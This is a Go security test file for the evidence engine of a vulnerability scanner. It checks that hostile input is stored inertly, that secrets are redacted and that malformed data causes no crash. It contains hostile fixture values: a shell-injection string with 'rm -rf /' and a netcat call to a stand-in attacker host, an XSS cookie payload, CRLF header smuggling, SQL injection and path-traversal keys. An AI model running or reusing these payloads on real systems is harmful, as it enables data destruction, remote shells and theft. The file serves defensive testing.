package evidence

import (
	"encoding/json"
	"go/parser"
	"go/token"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"sakanner/internal/correlation"
	"sakanner/pkg/models"
)

// Security tests (task section 36): the evidence engine must make no
// network requests, execute no commands, invoke no shell, interpret no
// HTML as code, evaluate no templates or expressions, and never crash
// on adversarial or malformed input. Every field of every raw
// evidence item is untrusted data supplied by whatever target the
// scanner probed.

func TestSecurity_SourceNeverTouchesFilesystemNetworkOrShell(t *testing.T) {
	forbidden := map[string]bool{
		"os/exec": true, "syscall": true, "net": true, "net/http": true,
		"text/template": true, "html/template": true,
	}
	entries, err := os.ReadDir(".")
	if err != nil {
		t.Fatalf("ReadDir: %v", err)
	}
	fset := token.NewFileSet()
	for _, e := range entries {
		name := e.Name()
		if !strings.HasSuffix(name, ".go") || strings.HasSuffix(name, "_test.go") {
			continue
		}
		file, err := parser.ParseFile(fset, filepath.Join(".", name), nil, parser.ImportsOnly)
		if err != nil {
			t.Fatalf("ParseFile(%s): %v", name, err)
		}
		for _, imp := range file.Imports {
			path := strings.Trim(imp.Path.Value, `"`)
			if forbidden[path] {
				t.Errorf("%s imports %q -- the evidence engine must remain a pure, in-memory transform with no filesystem/network/shell/template access", name, path)
			}
		}
	}
}

func buildFromRaw(t *testing.T, raw rawRequestResponseEvidence) []CanonicalEvidence {
	t.Helper()
	cf := findingWith("reflected_xss", "h.test", "/p", raw.Parameter, models.SeverityHigh, 0.9, raw)
	return BuildEvidence(cf, DefaultLimits())
}

func TestSecurity_CRLFInjectionInHeaderValue_NoCrashNoSmuggling(t *testing.T) {
	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200,
		Headers:          map[string]string{"X-Custom": "value\r\nX-Injected: evil\r\nSet-Cookie: sess=stolen"},
		ResponseFragment: "ok", Parameter: "q", Payload: "1",
	}
	items := buildFromRaw(t, raw)
	for _, it := range items {
		for k, v := range it.Request.Headers {
			if strings.ContainsAny(v, "\r\n") {
				t.Errorf("header %q value contains raw CRLF: %q -- must be preserved only as inert stored data, never usable to smuggle a real header", k, v)
			}
		}
	}
}

func TestSecurity_ControlCharactersAndNullBytes_NoCrash(t *testing.T) {
	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200,
		ResponseFragment: "before\x00\x01\x02\x1b[31mafter", Parameter: "q", Payload: "1",
		Observation: "context=html\x00note=null-byte-embedded",
	}
	items := buildFromRaw(t, raw)
	if len(items) == 0 {
		t.Fatal("no evidence produced")
	}
}

func TestSecurity_HTMLContentStoredLiterallyNeverExecuted(t *testing.T) {
	payload := `<script>alert(document.cookie)</script><img src=x onerror=alert(1)>`
	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200,
		Headers: map[string]string{"Content-Type": "text/html"}, ResponseFragment: "reflected: " + payload,
		Parameter: "q", Payload: payload,
	}
	items := buildFromRaw(t, raw)
	found := false
	for _, it := range items {
		if strings.Contains(it.Response.Excerpt, "<script>") {
			found = true
		}
	}
	if !found {
		t.Error("HTML payload must be stored as literal inert text, not stripped, escaped away, or evaluated")
	}
}

func TestSecurity_ShellMetacharactersStoredLiterallyNeverExecuted(t *testing.T) {
	payload := "; rm -rf / #" + "`id`" + "$(whoami)" + "| nc attacker.test 4444"
	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?host=" + payload, Response: "HTTP 200", StatusCode: 200,
		ResponseFragment: "PING " + payload, Parameter: "host", Payload: payload,
		Observation: "target=/p parameter=host probe=" + payload + " proof=ok",
	}
	items := buildFromRaw(t, raw)
	if len(items) == 0 {
		t.Fatal("no evidence produced")
	}
	// No crash and no attempt at interpretation is the whole test -- this
	// package has no exec/shell import at all (see the static check
	// above), so literal storage is the only possible outcome; this test
	// exists to document and lock that in against future regressions.
}

func TestSecurity_HugeObservationString_NoCrash(t *testing.T) {
	huge := strings.Repeat("key=value ", 2*1024*1024) // ~20MB of repeated tokens
	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200,
		ResponseFragment: "ok", Parameter: "q", Payload: "1", Observation: huge,
	}
	items := buildFromRaw(t, raw)
	limits := DefaultLimits()
	for _, it := range items {
		if len(it.Observation) > limits.MaxMetadataBytes {
			t.Errorf("Observation length = %d, want <= %d", len(it.Observation), limits.MaxMetadataBytes)
		}
	}
}

func TestSecurity_UnicodeAndRTLOverride_NoCrash(t *testing.T) {
	// \u202e = RIGHT-TO-LEFT OVERRIDE, \u202c = POP DIRECTIONAL FORMATTING,
	// \ufeff = BOM/ZERO WIDTH NO-BREAK SPACE -- written as Go escapes so
	// this source file itself stays plain ASCII.
	fragment := "\u202eevil\u202cnormal\U0001F600\ufeff"
	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200,
		ResponseFragment: fragment, Parameter: "q", Payload: "1",
	}
	items := buildFromRaw(t, raw)
	if len(items) == 0 {
		t.Fatal("no evidence produced")
	}
}

func TestSecurity_MalformedURL_NoCrash(t *testing.T) {
	for _, u := range []string{
		"http://%zz%zz/p", "http://[::1", "not a url at all", "http://h.test/p?%", "", "http://h.test:notaport/p",
	} {
		raw := rawRequestResponseEvidence{Request: "GET " + u, Response: "HTTP 200", StatusCode: 200, ResponseFragment: "ok", Parameter: "q", Payload: "1"}
		items := buildFromRaw(t, raw)
		if len(items) == 0 {
			t.Errorf("url %q: no evidence produced", u)
		}
	}
}

func TestSecurity_MalformedHeaders_NoCrash(t *testing.T) {
	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200,
		Headers: map[string]string{
			"":                         "empty-key",
			strings.Repeat("H", 50000): strings.Repeat("V", 50000),
			"Normal":                   "\x00\x01binary-ish",
		},
		ResponseFragment: "ok", Parameter: "q", Payload: "1",
	}
	items := buildFromRaw(t, raw)
	if len(items) == 0 {
		t.Fatal("no evidence produced")
	}
}

func TestSecurity_FakeSecretsAmidMaliciousFormatting_StillRedacted(t *testing.T) {
	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200,
		Headers:          map[string]string{"Authorization": "Bearer real-looking-secret-AAAA111"},
		ResponseFragment: `{"password": "p@ss<script>", "note": "unrelated"}`,
		Parameter:        "q", Payload: "1",
		Observation: `token="fake-secret-\"escaped\"-value" other=1`,
	}
	items := buildFromRaw(t, raw)
	for _, it := range items {
		if strings.Contains(it.Request.Headers["Authorization"], "real-looking-secret") {
			t.Error("Authorization secret leaked despite malicious formatting")
		}
		if strings.Contains(it.Response.Excerpt, "p@ss") {
			t.Error("password secret leaked despite malicious formatting")
		}
	}
}

func TestSecurity_DeeplyNestedJSON_NoCrash(t *testing.T) {
	depth := 2000
	body := strings.Repeat(`{"a":`, depth-1) + `{"password":"deepsecret"}` + strings.Repeat(`}`, depth-1)
	// Confirm this is at least valid JSON our own encoding/json can round-trip
	// before feeding it through redactJSON, so a failure below is this
	// package's fault, not a malformed fixture.
	var probe interface{}
	if err := json.Unmarshal([]byte(body), &probe); err != nil {
		t.Skipf("fixture itself is not valid JSON at this depth on this Go version: %v", err)
	}

	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200,
		Headers: map[string]string{"Content-Type": "application/json"}, ResponseFragment: body,
		Parameter: "q", Payload: "1",
	}
	items := buildFromRaw(t, raw)
	if len(items) == 0 {
		t.Fatal("no evidence produced")
	}
}

func TestSecurity_DeeplyNestedJSONArray_NoCrash(t *testing.T) {
	depth := 2000
	body := strings.Repeat(`[`, depth) + `"x"` + strings.Repeat(`]`, depth)
	var probe interface{}
	if err := json.Unmarshal([]byte(body), &probe); err != nil {
		t.Skipf("fixture itself is not valid JSON at this depth on this Go version: %v", err)
	}

	raw := rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200,
		Headers: map[string]string{"Content-Type": "application/json"}, ResponseFragment: body,
		Parameter: "q", Payload: "1",
	}
	items := buildFromRaw(t, raw)
	if len(items) == 0 {
		t.Fatal("no evidence produced")
	}
}

func TestSecurity_EmptyCanonicalFinding_NoCrash(t *testing.T) {
	cf := correlation.CanonicalFinding{}
	items := BuildEvidence(cf, DefaultLimits())
	_ = items // no panic is the assertion
}

func TestSecurity_NilEvidenceSlice_NoCrash(t *testing.T) {
	cf := findingWith("reflected_xss", "h.test", "/p", "q", models.SeverityHigh, 0.9, rawRequestResponseEvidence{})
	cf.Evidence = nil
	items := BuildEvidence(cf, DefaultLimits())
	if items == nil {
		// nil slice is fine; just confirm no panic occurred and reproduction
		// wasn't fabricated from nothing.
	}
}

func TestSecurity_MalformedMetadataMap_NoCrash(t *testing.T) {
	cf := findingWith("reflected_xss", "h.test", "/p", "q", models.SeverityHigh, 0.9, rawRequestResponseEvidence{
		Request: "GET http://h.test/p?q=1", Response: "HTTP 200", StatusCode: 200, ResponseFragment: "ok", Parameter: "q", Payload: "1",
	})
	cf.Metadata = map[string]string{
		"'; DROP TABLE evidence; --": "1",
		"$(rm -rf /)":                "1",
		"../../../../etc/passwd":     "1",
	}
	items := BuildEvidence(cf, DefaultLimits())
	if len(items) == 0 {
		t.Fatal("no evidence produced")
	}
}
